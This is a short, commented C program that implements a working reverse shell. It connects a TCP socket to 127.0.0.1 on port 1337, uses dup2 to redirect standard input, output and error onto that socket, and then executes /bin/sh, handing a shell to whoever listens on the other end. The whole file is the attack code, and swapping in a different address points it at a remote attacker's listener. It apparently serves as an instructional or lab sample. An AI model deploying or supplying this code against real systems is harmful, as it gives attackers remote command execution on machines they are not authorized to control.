#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
int main(int argc, char const *argv[])
{
    //connect to remote server at 127.0.0.1 on with port 1337:
    struct sockaddr_in serv_addr; 
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1337);
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    //Create socket:
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    //Connect to remote Server:
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    dup2(sockfd, 0); //redirect data from socket to STDIN   
    dup2(sockfd,1);  //redirect data from STDOUT to socket 
    dup2(sockfd,2); //redirect data from STDERR to socket 
    //execute "/bin/sh"
    char *args[] = { "/bin/sh", NULL };
    execv(args[0], args);
    //wait for instructions from remote
    close(sockfd);
    return 0;
}